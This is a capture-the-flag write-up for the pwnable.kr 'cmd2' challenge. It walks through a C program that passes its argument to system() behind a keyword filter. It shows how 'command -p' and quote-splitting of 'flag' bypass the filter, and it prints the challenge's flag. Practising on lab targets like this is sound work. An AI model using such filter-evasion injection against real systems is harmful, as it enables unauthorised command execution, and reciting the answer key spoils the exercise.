# cmd2

This is an upgrade from its prequel, [cmd1](/pwnable/toddler/cmd1.md). Let's take a look at its source code first, which is given.

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```

There's two interesting things going on here. The first is the `filter` command. It seems that it is significantly stricter, stopping us from changing any environmental variables. The second interesting thing is the `delete-env` command, which is executed upon startup. This is especially troublesome, because the command, as its name implies, deletes all environmental variables including the `PATH` variable.

Previously, we could work around the lack of a `PATH` definition by simply calling the directory of `cat`, through `/bin/cat flag`. However, that won't work here: `/` is under the filter.

Therefore, the obvious solution was to look for a built-in command that could accomplish the same thing. Luckily, such a command exists: `command`.

```
command [-pVv] command [arg ...]
              Run  command  with  args suppressing the normal shell function lookup. Only builtin
              commands or commands found in the PATH are executed.  If the -p  option  is  given,
              the  search  for  command  is  performed  using  a  default  value for PATH that is
              guaranteed to find all of the standard utilities.  If either the -V or -v option is
              supplied,  a description of command is printed.  The -v option causes a single word
              indicating the command or filename used to invoke command to be displayed;  the  -V
              option  produces  a  more verbose description.  If the -V or -v option is supplied,
              the exit status is 0 if command was found, and 1 if  not.   If  neither  option  is
              supplied  and an error occurred or command cannot be found, the exit status is 127.
              Otherwise, the exit status of the command builtin is the exit status of command.
```

`command` looks up a shell command, and either executes it or prints its description. Here, the -p flag allows us to look for a specific shell command and execute it, even if such a command isn't on the `PATH`.

Once we make that observation, everything else follows. However, there is still one more complication: the quotes. The obvious solution right now is simple:
```bash
./cmd2 "command -p cat flag"
```
However, this won't work, as flag is filtered. The workaround is surprisingly simple (Be careful when escaping quotes).
```bash
./cmd2 "command -p cat \"f\"\"l\"\"a\"\"g\""
```
Once we launch that, the answer is given immediately.
```
FuN_w1th_5h3ll_v4riabl3s_haha
```
